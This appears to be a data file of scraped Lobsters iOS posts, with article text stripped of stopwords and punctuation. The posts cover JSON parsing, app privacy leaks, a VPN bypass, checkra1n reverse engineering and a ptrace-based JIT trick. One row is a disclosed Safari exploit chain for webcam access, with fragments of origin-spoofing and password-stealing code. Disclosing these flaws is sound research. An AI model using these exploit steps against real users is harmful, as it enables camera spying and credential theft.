performance still great second mb slower basic nsjsonserialization parse slower slow simple complete parse via nsjsonserialization kvc however significantly faster previous thirdparty json swift object parser tune old first mark discount sale trick applied performance except relative number larger third party json parser looked little third party json parser particularly jason stjson zippyjson sttjson make claim speed manages clock second mb jason bill faster json parser compare swiftyjson reasonably well second mb however parse internal representation domain object structs compared nsjsonserialization point disappoint probably interesting zippyjson us daniel lemire simdjson codable compatible ala could nt get zippyjson compile nt number keep trying claim around faster apple jsondecoder would make parser least ballpark trivial nsjsonserialization kvc method showed another interesting tidbit come zippyjson readme heading much faster apple version first convert json nsdictionary using nsjsonserialization afterwards make thing swifty creation intermediate dictionary expensive true first converting intermediate representation slow particularly one heavyweight property list however primary reason creating expensive representation take total running time codable apparently talking speaking slowly corroborate also tried flightschool implementation codable messagepack obviously use nsjsonserialization make performance claim take second decode object used json file course different file mb size normalized mb file would mb max mason leave u considering simdjs show theoretically possible json parsing good place put mildly gb v mb apple jsondecoder several time slower nsjsonserialization nt exactly speed daemon around slower pure object creation comically bad might another way putting least entertained contribute well xml result wasis max messaging api xml parser superfast though simd also present apis make superconvenient also superfast go directly xml objectrepresentation either tree stream domain object using mostly constant memory mentioned book yeah book gory detail anyway xml sorta faded question whether technique would work json parser answer yes roughly though added complexity le convenience json le informative file format xml open closetags really give good headsup coming goal produce domain object close theoretical maximum slightly mb possible time making parser convenient use close swift codable convenience wo nt support codable per default overhead seem high zippyjson suggests adapter would nt hard parser mpwmasonparser nt done yet initial state par json dictionary second mb slightly slower nsjsonserialization bit way go come join little parsing performance journey
68,Lobsters,ios,Apple iOS,Secret iPad,https://thinkfractional.blog/secret-ipad/,secret ipad,building shape,post emerged ran course passed away might enjoy latest post building shape jack ivers
69,Lobsters,ios,Apple iOS,A walkthrough of getting unauthorized camera access in Safari,https://www.ryanpickren.com/webcam-hacking,walkthrough getting unauthorized camera access safari,bugpoc camera security model mediadevices webrtc mediadevices secure context perwebsite basis origin generic uri syntax hard bugpoccompoc bugpoc tangled web generic uri syntax spec mucking parent type windowhistory explicitly prohibit origin inherit origin opener webkit bug report bizarre variation file uri broken browser bugpoc mock endpoint bugpoccompoc spec serialized effective domain opaque origin origin serialization standard bugpoccompoc bpwkiedjre http examplecom locationreplace windowhistory spec hotly debated browser dependent sandboxed iframe,post contains real bugpoc link used report bug apple download safari want check live demo apple used reproduce issuesbackgroundthe goal project hack iosmacos webcam vulnerability uncovered hunt bonus bug jump want start quote old colleague mine bug hunting finding assumption software violating assumption see happens precisely going today going dive murky depth safari hammer browser obscure corner case uncover weird behavior quirk collect enough quirk tie together full kill chainthe camera security model io macos pretty intense nutshell app must explicitly granted cameramicrophone permission handled o via standard alert boxbut exception rule apple apps get camera access free mobile safari technically access camera without asking furthermore new web technology mediadevices web api commonly used webrtc transmission allow website utilize safari permission access camera directly great webbased video conferencing apps skype zoom new webbased camera tech undermines o native camera security model paper titled study webrtc security put conundrum nicely user chooses suitable browser know trust webrtc communication considered secure word level trust provided user webrtc directly influenced user trust browser question iosmacos user must ask much trust safari quick side note get going encryption mandatory feature webrtc enforced exposing mediadevices api website deemed secure context mean even awesome uxss bug like unable get camera access camera protected deep gut safarisome quick research show safari keep track permission setting perwebsite basis let website access sensitive content gps location camera without always asking permission basically allow skype access camera whenever want trust skype see website currently trust safari preference websitesthis feature essentially required safari reimplement security model scratch context natural question model brings well safari keep track website beginning form attack plan somehow trick safari thinking evil website secure context trusted website leverage safari camera permission access webcam via mediadevices apikeeping track websitesin order safari use website setting course need know website currently viewing abstractly actually fundamental responsibility browser core upholding sameoriginpolicy trying trick browser failing responsibility key uxss sop bypass exploit minute playing around noticed something strange safari seemed use origin keep track currently open website fact method keeping track website quite bizarrein example browser window unique origin however safari seems think website open experimentation deduced safari likely running generic uri syntax parser open window get uris hostnames extra parsing specifically safari seems remove www start hostnames super interesting know parsing url hardafter light hostname fuzzing noticed weird quirk hostnames dash period touching ie completely invisible safari currently open website feature unable immediately figure use quirk get camera still interesting observation sort unnerving http fooevilcom would missing menu working demo bugpoc bugpoccompoc password note demo work viewed using safari bugpoc super useful demonstration purpose let instantly create custom subdomain hosting html code nifty important observation url scheme completely ignored problamatic scheme contain meaningful hostname file javascript data scheme contain hostname within embedded uri tangled web dubbed encapsulating pseudo protocol viewsource blob able simply grab string treat valid hostname bad assumption safari retrospect safari kept whitelist scheme parsed like http http w etc time find way exploit faulty assumption let start playing pseudoprotocolsthe usual suspectsthe goal create uri parsed using generic uri syntax defined rfc produce arbitrary hostname trusted victim easy right obvious place start javascript data tl dr none worked dont like story dead end recommend jump next section javascript really hopeful one javascript skypecom trick right hostname seen safari context skypecom wrong turn safari attempt open url page actually load blank content sent directly javascript engine without touching url bar word windowlocationhref actually equal javascript skypecom view page tried handful way halt page loading trick safari giving href however none successful moving data next data goal create uri valid parsed rfc data rfc oldschool authority uris polyglot url testing came data skypecom opened page using standard windowopen checked safari preference safari think skypecom currently open success problem technically valid data uri mimetype recognizable safari browser spec dictate default mimetype textplain mean data skypecom script alert script produce harmless text file safari might confused looking file anything evil without javascript execution safari follows modern best practice giving every data uri unique origin dynamically populate document javascript post rendering w open data skypecom wdocumentwrite script alert script securityerrorbummer isolated origin protection actually developed prevent new document mucking parent vice versa technically thwart type attack tried handful different way tricking safari rendering textplain data uri html none successful perhaps one day type anchor tag attribute ever get implemented taking closer look safari internally parsing url decided give windowhistory try perhaps could start html data uri alter pathname skypecom without actual page loading navigation thus mimetype updating unfortunately u rfc god sortof saw coming explicitly prohibit using historypushstate historyreplacestate change origin note spec reference true algorithmic definition origin classic schemehostport tuple case data uri historyreplacestate would change origin opaque origin opaque origin b buenohistoryreplacestate data skypecom securityerrorabout last shortlist one seemed surprisingly fruitful skypecom actually accepted safari something like chrome error however unable dynamically populate document w open skypecom wdocumentwrite script alert script securityerrorit seems safari allows blank srcdoc inherit origin opener found old webkit bug report considered loosening restriction dice skypecom get unique opaque origin like data also mean historypushstate shenanigan also blocked file rescuethe next scheme started messing around file scheme contain meaningful hostname right digging deep rfc rabbit hole actually stumbled upon bizarre variation file uri contain hostname type uri actually specifies remote server similar ftp however retrieval mechanism file stored remote machine defined specification searching interwebs unable find user agent actually support obscure uri typefile hostexamplecomsharepathtofiletxtpretty funky curiosity checked safari internally par normal file uria expected hostname blank decided go ahead specify host using javascript see happenswhat hell page actually accepted uri valid reloaded content mean changed documentdomain using really dumb trick sure enough safari think skypecom load evil javascript camera microphone screen sharing compromised open local html file bonus safari also seems use lazy hostname parsing method fill autocomplete password steal plaintext password accept autocomplete script locationhost googlecom locationhost googlecom else alert documentdomain script hunt right wrong hack required victim open local html file better plus work io local file downloaded via mobile safari get shown previewstyle embedded view without javascript engine let keep looking bonus bug autodownloadsin attempt make file hack realistic decided look could trick safari automatically downloading malicious html file website course downloading file half battle victim still need open remembered reading simple referer header spoofing bug edge broken browser ago turn similar technique could used easily bypass autodownload prevention safari open trusted website popup reuse popup download link used bugpoc mock endpoint feature make url contentdisposition attachment response header containing small text file demo bugpoc demo bugpoccompoc password note demo work viewed using safari ok back camera hunt blob weirdnessthe blob encapsulating pseudo protocol interesting tool let directly access file tucked away browser memory using random identifier let easily reference file create fly type uris typically used image video however interesting feature actually allow specify mimetype safari even try best render anything make html document open new tabblob new blob hello world type texthtml url urlcreateobjecturl blob open url blank blob dictate algorithm browser must use generate neat uris tl drblob origin creating document random uuid subtlety algorithm worth calling origin serialized string happens origin making blob uri meaningful serialization like null effective domain document opaque origin quick reminder opaque origin like one given data texthtml foo foo always get serialized string null serialization meaning internally safari treat data texthtml foo data texthtml bar two unique origin even though become null stringified well spec say browser figure one serialized null set implementationdefined value got ta love ambiguity spec let see safari handle odd case start data uri give ourself opaque origin data texthtml foobar create blob uriinteresting serialized origin blob uri literally string null like print console serialization definition curious safari would know opaque origin allowed open uri experimenting determined safari fact enforce sop must using random uuid help find true creating origin opening blob uri using javascript creating document worked expected new document able inherit opaque origin rfc god always wanted attempting use javascript open uri different opaque origin resulted error also expected noticed something weird manually typing url safari address bar gave origin appeared blank origin safari thought appropriate give opaque origin created document fact according origin serialization standard opaque origin result blank scheme blank host blank port run algorithm going forward refer bizarre origin magical blank origin playing around discovered nullbloburi inherits origin opener catch safari check make sure opener allowed open url first thus upholding sop mess opener normal document working demo bugpoc bugpoccompoc bpwkiedjre password note demo work viewed using safari accessing uri bookmark caused really bizarre behavior see safari attempt grant nullbloburi http examplecom origin however fails actually document stored memory location hence webkitblobresource error safari apparently able find document opener blank origin evidently stumbled upon bizarre origin equivalent null context technically opaque needed type nullbloburi address bar manually get need find way programmatically get magic blank origin basically method simulating manual address bar entry luckily api locationreplace api replaces current resource url originally navigated remember safari check make sure permission view url location replacing need come document created url new blob hello world type texthtml url urlcreateobjecturl blob locationreplace url nice successfully hopped data uri opaque origin blob uri blank origin historyback tried use windowhistory muck data uris unsuccessful changing pathname inadvertently changed opaque origin behavior explicitly disallowed history spec let see anything different longer opaque origin quick reminder look like point try something pretty aggressive historypushstate blob skypecom securityerrorbummer appears safari correctly realizes pushstate would send u new origin noticed something really strange pushstates allowed historypushstate blob historypushstate skypecom locationhref blob skypecomwhat going behavior disallowed tried one fell swoop totally fine break well step determine blob uris origin found best guess safari correctly think origin blob skypecom new opaque origin step spec reason considers origin blob calling blank origin step spec fixed part current origin also pushstate permitted next pushstate change pathname safari nt see problem like locationhref blob skypecom quick check safari preference show skypecom currently open website finally done however autodownloads autopopups autocomplete plaintext password good stuff webcam let keep tryingsecure context without tl secure context window worker reasonable confidence content delivered securely via httpstls potential communication context secure limited many web apis feature accessible secure context primary goal secure context prevent maninthemiddle attacker accessing powerful apis could compromise victim attack ok understandable requirement use webrtc would pretty scary anybody wifi could access webcam assuming visiting http website youve previously trusted time find new bug circumvent requirement digging deep secure context spec noticed contradiction browser permitted also treat file url trustworthy convenient developer building application deploying public curious safari implemented exception started exploring make file url unique sop rule around protocol hotly debated time origin url browser dependent modern version safari give file separate opaque origin experimentation discovered safari lazily treat document opaque origin secure context really big oversight easy http site create opaque origin document one obvious way sandboxed iframe iframe src sandbox iframe issue spec say page secure context page along parent opener chain must delivered securely mean opaque origin document embedded http website ultimately considered insecurelucky u safari seemed ignore opener chain part spec check parent secureness let u simply open popup within sandboxed iframe make secure context window
71,Lobsters,ios,Apple iOS,Swift Package Registry,https://swiftpackageregistry.com/,swift package registry,alamofire chart sdwebimage lottie swiftyjson reactivecocoa vapor rxswift hero snapkit kingfisher mbprogresshud iqkeyboardmanagerswift realm carthage swiftlint fmdb promisekit moya cocoaasyncsocket eureka foldingcell nvactivityindicatorview skeletonview quick swifterswift objectmapper ibanimatable cryptoswift swiftpm rswift purelayout kitura cartography sqliteswift reachability jtapplecalendar reswift facebook swiftgen starscream swiftnio viewanimator swiftdate gitignoreio keychainaccess swiftai fspagerview macaw nuke,alamofire elegant http networking swift chart beautiful chart iostvososx apple side crossplatform mpandroidchart sdwebimage asynchronous image downloader cache support uiimageview category lottie io library natively render effect vector animation swiftyjson better way deal json data swift reactivecocoa cocoa framework objc dynamism binding reactiveswift vapor serverside swift web framework rxswift reactive programming swift hero elegant transition library io tvos snapkit swift autolayout dsl io o x kingfisher lightweight pureswift library downloading caching image web mbprogresshud mbprogresshud customizations iqkeyboardmanagerswift codeless dropin universal library allows prevent issue keyboard sliding cover uitextfielduitextview neither need write code setup required much realm realm mobile database replacement core data sqlite carthage simple decentralized dependency manager cocoa swiftlint tool enforce swift style convention fmdb cocoa objectivec wrapper around sqlite promisekit promise swift objc moya network abstraction layer written swift cocoaasyncsocket asynchronous socket networking library mac io eureka elegant io form builder swift foldingcell octocat foldingcell expanding content cell animation made ramotion nvactivityindicatorview collection awesome loading animation skeletonview elegant way show user something happening also prepare content waiting quick swift objectivec testing framework swifterswift handy collection native swift extension boost productivity objectmapper simple json object mapping written swift ibanimatable design prototype customized ui interaction navigation transition animation app store ready apps interface builder ibanimatable cryptoswift cryptoswift growing collection standard secure cryptographic algorithm implemented swift swiftpm package manager swift programming language rswift strong typed autocompleted resource like image font segue swift project purelayout ultimate api io o x auto layout impressively simple immensely powerful objectivec swift compatible kitura swift web framework http server cartography declarative auto layout dsl swift iphone triangularruler sqliteswift typesafe swiftlanguage layer reachability replacement apple reachability rewritten swift closure jtapplecalendar unofficial apple io swift calendar view swift calendar library io calendar control customizable reswift unidirectional data flow swift inspired redux facebook used integrate facebook platform io tvos apps swiftgen swift code generator asset storyboards localizablestrings get rid stringbased apis starscream websockets swift io osx swiftnio eventdriven network application framework high performance protocol server client nonblocking viewanimator viewanimator brings ui life one line swiftdate parse validate manipulate display date time timezones swift gitignoreio create useful gitignore file project keychainaccess simple swift wrapper keychain work io watchos tvos macos swiftai swift machine learning library fspagerview fspagerview elegant screen slide library extremely helpful making banner slider macaw powerful easytouse vector graphic swift library svg support nuke powerful image loading caching system
72,Lobsters,ios,Apple iOS,"Dark Sky Acquired by Apple, announced plans to shut down outside of iOS",https://blog.darksky.net/dark-sky-has-a-new-home/,dark sky acquired apple announced plan shut outside io,update update happens existing product purchase app store thank,adam grossman august update android wear o apps shut august subscriber active time receiving full refund weather forecast map dark sky website remain active adam grossman july update service existing user subscriber android app continue august point app shut subscriber active time receive full refund weather forecast map embeds available dark sky website also shut august adam grossman march today important exciting news share dark sky joined apple goal always provide world best weather information possible help many people stay dry safe way respect privacy better place accomplish goal apple thrilled opportunity reach far people far impact ever could alone happens existing product io app change dark sky io time continue available purchase app store android wear o app app longer available download service existing user subscriber continue july point app shut subscriber still active time receive refund website weather forecast map embeds continue july website remain active beyond time support api io app customer api api service existing customer changing today longer accept new signups api continue function end part transition use dark sky apple subject apple privacy policy found applecomprivacy thank customer family friend grateful support past eight year look forward continuing build great product stay dark sky team
73,Lobsters,ios,Apple iOS,Zoom iOS app sending data to Facebook even w/o FB account,https://9to5mac.com/2020/03/27/zoom-ios-app/,zoom io app sending data facebook even wo fb account,privacy especially facebook seeing record use keep touch via group video call activate mac webcam vice check youtube apple news,update app updated remove data transfer see explanation company zoom io app sharing data facebook without declaring privacy policy happens whether facebook account data shared facebook includes iphone ipad model timezone city phone carrier unique identifier used adtargeting discovery made motherboard confirmed io security researcher strafach upon downloading opening app zoom connects facebook graph api according motherboard analysis app network activity graph api main way developer get data facebook zoom forthcoming data collection transfer facebook zoom policy say company may collect user facebook profile information use facebook login product create account product explicitly mention anything sending data facebook zoom user facebook account piece note uncommon apps use facebook sdk sort data transfer uncommon especially facebook plenty apps use facebook software development kit sdk mean implement feature apps easily also effect sending information facebook permitted facebook however without notifying user zoom user may aware happening understand use one product may providing data another service altogether facebook told motherboard requires developer transparent user data apps send facebook facebook term say use pixel sdks represent warrant provided robust sufficiently prominent notice user regarding customer data collection sharing usage specifically apps third party including facebook may collect receive information app apps use information provide measurement service targeted ad zoom seeing record use coronavirus crisis business consumer use keep touch via group video call first time privacy issue zoom major vulnerability last year meant website able activate mac webcam without first asking permission recently suggested host monitor apps use though appears apply corporatelymanaged machine time writing company commented issue zoom io app update vice report facebook code removed zoom zoom take user privacy extremely seriously originally implemented login facebook feature using facebook sdk order provide user another convenient way access platform however recently made aware facebook sdk collecting unnecessary device data zoom told motherboard statement friday ftc use income earning auto affiliate link check youtube apple news video
74,Lobsters,ios,Apple iOS,Unpatched iOS Bug Blocks VPNs From Encrypting All Traffic,https://www.bleepingcomputer.com/news/security/unpatched-ios-bug-blocks-vpns-from-encrypting-all-traffic/,unpatched io bug block vpns encrypting traffic,cv base score connection remain open exposed exposed connection apple server protonvpn say temporary workarounds alwayson vpn device management connect vpn server turn airplane mode turn airplane mode,currently unpatched security vulnerability affecting io later prevents virtual private network vpns encrypting traffic lead internet connection bypassing vpn encryption expose user data leak ip address connection made connecting vpn io device affected bug previously established connection remain outside vpn secure tunnel protonvpn disclosed vpn bypass vulnerability rated cv base score discovered security consultant part proton community disclosed protonvpn make user vpn provider aware issue connection remain open exposed bug due apple io terminating existing internet connection user connects vpn automatically reconnect destination server vpn tunnel established connection shortlived eventually reestablished vpn tunnel protonvpn explains however longlasting remain open minute hour outside vpn tunnel time connection outside vpn secure communication channel issue lead serious consequence instance user data could exposed third party connection encrypted ip address leak could potentially reveal user location expose destination server attack exposed connection apple server protonvpn even though user see traffic exchanged device local ip address vpn server ip address also show server ip screenshot previously opened connection terminated vpn connects protonvpn say apple push notification good example process using connection apple server wo nt closed automatically bug affect service app running user io device web beacon instant messaging application highest risk security flaw people country surveillance civil right abuse common protonvpn say neither protonvpn vpn service provide workaround issue io permit vpn app kill existing network connection temporary workarounds apple acknowledged vpn bypass vulnerability protonvpn report currently looking option fully mitigate fix provided apple recommends using alwayson vpn mitigate problem however since workaround us device management used mitigate vulnerability thirdparty vpn apps protonvpn protonvpn recommends following procedure using thirdparty vpn connect vpn server turn airplane mode kill internet connection temporarily disconnect vpn turn airplane mode vpn reconnect connection also reconnect inside vpn tunnel reliable
75,Lobsters,ios,Apple iOS,Popular iPhone and iPad Apps Snooping on the Pasteboard,https://www.mysk.blog/2020/03/10/popular-iphone-and-ipad-apps-snooping-on-the-pasteboard/,popular iphone ipad apps snooping pasteboard,talal haj bakry tommy mysk update august update june apps stopped reading clipboard crossed enjoyed work video summary introduction precise location information leaking system pasteboard pervious article methodology criterion previous article finding list apps update august update june apps stopped reading clipboard crossed news abc news al jazeera english cbc news cbs news cnbc fox news news break new york time npr ntv nachrichten reuters russia today stern nachrichten economist huffington post wall street journal vice news game ball amaze bejeweled block puzzle classic bejeweled classic bejeweled hd flipthegun fruit ninja golfmasters letter soup love nikki emma plant v hero pooking billiards city pubg mobile tomb mask tomb mask color total party kill watermarbling social networking tiktok totalk tok truecaller viber weibo zoosk happier meditation radio police scanner accuweather aliexpress shopping app bed bath beyond dazn hotelscom hotel tonight overstock pigment adult coloring book recolor coloring book color sky ticket weather network conclusion medium coverage,talal haj bakry tommy mysk update august apps crossed update june list apps original report march exhaustive list examined sample popular apps listed one exhibited behavior excessive clipboard access many apps updated since light tested apps apps stopped reading clipboard crossed enjoyed work support u checking apps video two apps one snoop clipboard video video method view pasteboard event using xcode video summary article provides investigation popular apps frequently access pasteboard without user consent apps range popular game social networking apps news apps major news organization found many apps quietly read text found pasteboard every time app opened text left pasteboard could simple shopping list could something sensitive password account number etc introduction apps io ipados unrestricted access systemwide general pasteboard also referred clipboard potential security risk vulnerability thoroughly discussed previous article precise location information leaking system pasteboard explored popular top apps available app store observed behaviour using standard apple development tool result show many apps frequently access pasteboard read content without user consent albeit textbased data apps chose investigation belong various app store category eg game social networking news described pervious article severity pasteboard vulnerability greatest popular frequentlyused apps exploit thus targeted variety popular apps found top list app store methodology apple provides xcode xcode command line tool developer build apps io ipados macos used official tool monitor analyze behavior apps installed io ipados device method simple connect pair device xcode read system log device fortunately pasteboard event clearly logged figure show example system log output fox news app opened following explains key information log output log output event filtered keyword pasteboard highlighted event figure show fox news app requested access pasteboard id comappleuikitpboardgeneral id systemwide pasteboard bundleid comfoxnewsfoxnews id uniquely identifies fox news app app store event message start loading item figure indicates app read content pasteboard type indicates content app read text method performed io mac developer figure figure criterion include app request read content systemwide pasteboard every time opened consider highly suspicious game apps provide ui deal text yet read text content pasteboard every time opened every app popular top list according app store ranking qualifies part investigation however picked diverse collection apps provide proof suspicious practice snooping pasteboard exists many apps considerable number apps read content pasteboard launch app read pasteboard opened first time next time read pasteboard app quit relaunched although behavior also suspicious decided exclude apps focus one access pasteboard frequently noted previous article app access pasteboard also read copied mac universal clipboard enabled finding unrestricted access pasteboard allow apps read data type apps investigated article requested access text data word interested reading text ignore data type may copied pasteboard photo pdf document surprisingly none widget tested accessed pasteboard finding documented apps read pasteboard every time app opened however apps delay snooping pasteboard time event take place eg signing hence included finding list apps section summarizes list apps snoop pasteboard every time app opened apps listed alphabetically following format update august apps crossed update june list apps original report march exhaustive list examined sample popular apps listed one exhibited behavior excessive clipboard access many apps updated since light tested apps apps stopped reading clipboard crossed thank developer updated apps fix privacy issue news abc news comabcnewsabcnews al jazeera english ajenglishiphone cbc news cacbccbcnews cbs news cnbc comnbcunicnbccnbcrtipad fox news comfoxnewsfoxnews news break comparticlenewsnewsbreak new york time comnytimesnytimes npr orgnprnprnews ntv nachrichten dentvntvmobil reuters comthomsonreutersreuters russia today comrtrtnewsenglish stern nachrichten degrunerundjahrsternneu economist comeconomistlamarr huffington post comhuffingtonposthuffingtonpost wall street journal comdowjoneswsjipad vice news comvicenewsvicenews game ball amaze comamazegame bejeweled comeaiosbejeweledskies block puzzle gameblockpuzzle classic bejeweled classic bejeweled hd flipthegun complaygendaryflipgun fruit ninja comhalfbrickfruitninjalite golfmasters complaygendarysportmasterstwo letter soup love nikki comelexnikki emma comcrazylabsmyemma plant v hero comeaiospvzheroes pooking billiards city compoolclubbilliardscity pubg mobile comtencentig tomb mask comhappymagentafromcore tomb mask color total party kill comadventureislandstotalpartykill watermarbling comhydrodipping social networking tiktok comzhiliaoappmusically totalk totalkgofeiyucom tok comsimpledatetok truecaller comtruesoftwaretruecallerother viber comviber weibo comsinaweibo zoosk comzooskzoosk happier meditation radio police scanner accuweather comyourcompanytestwithcustomtabs aliexpress shopping app comalibabaialiexpress bed bath beyond comdigbybedbathbeyond dazn comdazntheapp hotelscom comhotelshotelsnearme hotel tonight comhoteltonightprod overstock comoverstockapp pigment adult coloring book compixitepigment recolor coloring book color comsumoingrecolor sky ticket deskyskyonline weather network comtheweathernetworkweathereyeiphone conclusion access pasteboard io ipados requires app permission io pasteboard provides ease sharing data various apps pose risk exposing private personal data suspicious apps investigated many popular apps app store found frequently access pasteboard without user aware investigation confirms many popular apps read text content pasteboard however clear apps data prevent apps exploiting pasteboard apple must act medium coverage article wellreceived social medium covered several tech website following list provides link coverage
76,Lobsters,ios,Apple iOS,Project Sandcastle: Android for the iPhone,https://projectsandcastle.org/,project sandcastle android iphone,,sandbox set limit boundary sandcastles provide opportunity create something new limitless bound imagination project sandcastle building something new silicon hardwarethe iphone restricts user operate inside sandbox buy iphone iphone hardware android iphone give freedom run different operating system hardwareandroid iphone many exciting practical application forensics research dualbooting ephemeral device combatting ewaste goal always push mobile research forward excited see developer community build foundation
77,Lobsters,ios,Apple iOS,Reverse engineering checkra1n stage2(pongoOS) and stage3(kpf) binary,http://misty.moe/2020/03/01/reverse-engineering-checkra1n-stage2pongoos-and-stage3kpf-binary/,reverse engineering pongoos kpf binary,motivation get binary analyze pongoos loading self hijacking iboot main loop init task booting caveat fun analyze kpf deobfuscate module entry autoboot preboot hook making debugging module pongoos,note related binary found http githubcomnyamistypongoreverse motivation currently settled io version totally unsupported team want use device also definitely know team add support old io version forseeable future decided make stock kpf failed obviously pongoos also crash trying disable kpf using bootux command disappointing making even frustrating forgot dcsd cable kong cable school entryprohibited due coronavirus outbreak neither get quite lot debug output generated iboot pongoos debugging iboot using jtag decided something without cable still play around pongoos pongokit however team release pongoos related document except header file pongoh making totally blackbox like aapl debug make module pongoos reverse engineering first get binary team bundle everything single executable file obfuscated executable using custom llvm based obfuscator called hikari made friend james much difficulty trying directly analysis executable however according public log document split part exploit securerom loader iboot pongoos kernel patchfinder aka kpf bootstrapper executable like pongoos kpf running baremetal arm heavily obfuscated easily obtain capturing usb traffic using wireshark macos following instruction http wikiwiresharkorgcapturesetupusb macos quicklly get traffic dump executables usually something large filtering packet based packet length also note usb request type documented pongokit information easily find payload like got payload data long payload data operation freely wireshark follow traffic functionality usb manually reconstruct payload exported packet length c source using wireshark export packet dissection stripped usb header fwrite whole file first part pongoos look like second part would kpf module macho file search macho header magic locate third part would ramdisk found using magic rdskrdsk analyze pongoos loading self simply load image address find copying whole payload return address reexecute start hijacking iboot time instead calling initial function renamed doautoboot fact function called twice securerom trying boot iboot iboot trying boot kernel check whether additional boot info available check whether patching iboot iboot following thing patch iboot version string kjc loader located find ic iallu instrucution bzero func inline hook check whether bzero argument prevent memory zeroed find boot trampoline unique instruction mov patch next boot address continue call iboot wait called iboot boot trampoline main loop iboot jumping kernel also enclose bootarg struct additional boot argument trigger doautoboot calling startboot startboot initialize gbootargs gentrypoint exported pongokit set excetion vector table pongoos mainloop called come mainloop pongoos alive start initialize sort thing including screen usb task subsystem irq handler start task dispatching loop course starting dispatching loop pongoos register initial task first init task init task uart serial initialized banner printed builtin command registered detect whether kpf present loading using modload calling autoboot command kpf finish call registered bootx command boot xnu kernel bootx command set curboottype booting curboottype variable zero task dispatching loop stop mainloop continue boot first check preboothook fall bootux logic fact curboottype pongoos check additional ramdisk present present find slot memorymapreserverslot memorymap attache ramdisk onto note strcmp aramdisk aramdisk always zero first entry memorymap free slot fail immediately haha completed return go back startboot function clear sort special register jumping gentrypoint using doboot function fact pongoos already partial linux booting support fdt already constructed caveat fun fact analyzing whole pongoos entrypoint really hard instead firstly located whole code segment making function ida using script found symbol table modload command renamed function command traced understood whole process also seems pongoos using fullfledged libc make printf function big marked function decompiled case forgot analyze kpf deobfuscate kpf module standard macho team obfuscated using hikari expected still baremetal enable obfuscation method string encryption simple bcf enabled see made script parse hexrays generated code decrypt patch ida database everything go well module entry every pongoos module moduleentry function kpf one simply registered kpfflags autoboot command setup preboothook autoboot autoboot called pongoos first find rdskrdsk sequence find additional ramdisk loaderargs copy ramdiskbuf made editor template extract information pongo shell requested continue reregister shell abuse modloadnshelln command sequence handleshell simply execute bootx preboot hook boot preboothook called main patchfinder logic located preboothook find kernel base searching macho header upward gentrypoint sort finding patching making debugging module pongoos gone whole pongoos kpf complete indepth look pongoos time experiment integrating capstone embedded printf implementation finished small module allows dump pongoos exported vairables entrypointbootargdevicetreeetc operate memory readwritedisassemblesearchhexdump print memory map located int devicetree hard write module kernel without detailed document source code thorough analysis module fact provides example using many pongoos export function possibiely make others feeling better developing pongoos due still operating baremetal memory access big trouble must access memory aligned way need manually barrier memory access even frustrating proofofconcept module implementation simply ignoring random crash change parameter little patient rerun really fast
78,Lobsters,ios,Apple iOS,Jailed Just-In-Time Compilation on iOS,https://saagarjha.com/blog/2020/02/23/jailed-just-in-time-compilation-on-ios/,jailed justintime compilation io,introducing wx jit bulletproof jit wx loophole must disable set using request attach disables code signing validation limitation normal cacheflushing recommendation apply jumbo va space fairly elaborate calculation man page parent process expect trace child probably rather confused result traced process stop made continue except via ptrace,justintime compilation io normally requires application posse dynamiccodesigning entitlement privilege apple uniquely award system process require highperformance tier javascriptcore true justintime compiler require ability generate executable page invalid code signature practice usually prohibited io thirdparty apps sidestep code validation guarantee apple would like enforce application use mmap mapjit without entitlement usual way create rwx region jit purpose method work device without jailbreak though combination unfit app store really useful speeding virtual machine make seemingly unknown outside emulation community technique relies somewhat arcane side effect debugging work io enable slightly limited jit update preliminary testing io seems indicate apple changed kernel trick longer work introducing wx jit simplest way implement jit create page protwrite protexec along bulletproof jit enabled simultaneously writing code region executing code generated fly lack code signature back mmap mach vm equivalent allow kind mapping process requesting posse dynamiccodesigning entitlement pass mapjit flag mentioned previously actually need permission time unless generating selfmodifying code need write permission writing code memory execute permission executing fact continually flipped permission page back forth protwrite protexec based generating running code able implement justintime compiler still maintaining exclusivity never page many platform io enforce policy default rudimentary security mitigation including openbsd approach work continuously changing page permission often quite slow better solution performance ab use memory mapping map physical page twice two virtual address one accessible write permission one enables execute permission perspective virtual memory address space still wx using appropriate pointer access memory region effectively rwx csdebugged loophole io normally reason thirdparty process need posse invalid page except one debugged since setting breakpoints requires overwriting code appropriate trapping instruction debugging process must disable cskill cshard flag would ordinary cause process killed code signature becomes invalid program state instead csdebugged flag set usual way flag get set using xcode debug app cause debugserver attach process using ptrace ptattachexc request deprecated ptattach except cause signal delivered mach exception see however relying debugserver make jit work somewhat inconvenient cumbersome ideally would way without connected xcode time since attach nice could create new temporary process sole purpose attach set nonjailbroken io spawn new process hmm closer look ptrace documentation reveals interesting request pttraceme intended used process expects traced addition interesting property called child process debugger also disables code signing validation fun fact interestingly disables validation parent process well reason wonder calling ordinary process end disabling validation parent process launchd blocked mac need call ptrace pttraceme request argument ignored need implement wx jit unfortunately true rwx jit would still require dynamiccodesigning mmap check entitlement specifically granting mapjit request sysptraceh io sdk function still present loaded every process c forward declare function appropriate constant dynamic linking take care rest include systypesh define pttraceme int ptrace int pidt caddrt int int main void ptrace pttraceme null swift process little involved still fairly straightforward import darwin let pttraceme cint let ptrace unsafebitcast dlsym dlopen nil rtldlazy ptrace convention c cint pidt caddrt cint cint self ptrace pttraceme nil limitation rwx jit huge deal still map memory twice limitation consider since arm normal cacheflushing recommendation apply unlike process dynamiccodesigning get access jumbo va space io application normally allocate limited amount virtual memory determined using fairly elaborate calculation based size physical memory however one major issue actually described description pttraceme man page ptrace pttraceme request one two used traced process declares process expects traced parent argument ignored parent process expect trace child probably rather confused result traced process stop made continue except via ptrace process used request call execve routine built execv stop executing first instruction new image also setuid setgid bit executable executed ignored part emphasized quite important process end stopping reason impossible start process ptraced stop upon delivery signal normally parent process respond appropriately cause launchd idea traced know handle correctly program crash killed system process exit cause entire system slowly grind halt think first try repeatedly sigkill process fails hang something important waiting process termination never come one way avoid convert signal mach exception using ptsigexc ptrace request install mach exception handler handle import machmachh import pthreadh import syssysctlh import appdelegateh booleant excserver machmsgheadert machmsgheadert int ptrace int pidt caddrt int define pttraceme define ptsigexc kernreturnt catchexceptionraise machportt exceptionport machportt thread machportt task exceptiontypet exception exceptiondatat code machmsgtypenumbert codecount forward request nextlevel mach exception handler probably reportcrash return kernfailure void exceptionhandler void argument machportt port machportt argument machmsgserver excserver port return null int main void ptrace pttraceme null ptrace ptsigexc null machportt port machportnull machportallocate machtaskself machportrightreceive port machportinsertright machtaskself port port machmsgtypemakesend ptsigexc map signal excsoftware note interfere debugger try thing via ptattachexc usually check predicate execution following code whether attached tasksetexceptionports machtaskself excmasksoftware port exceptiondefault threadstatenone pthreadt thread 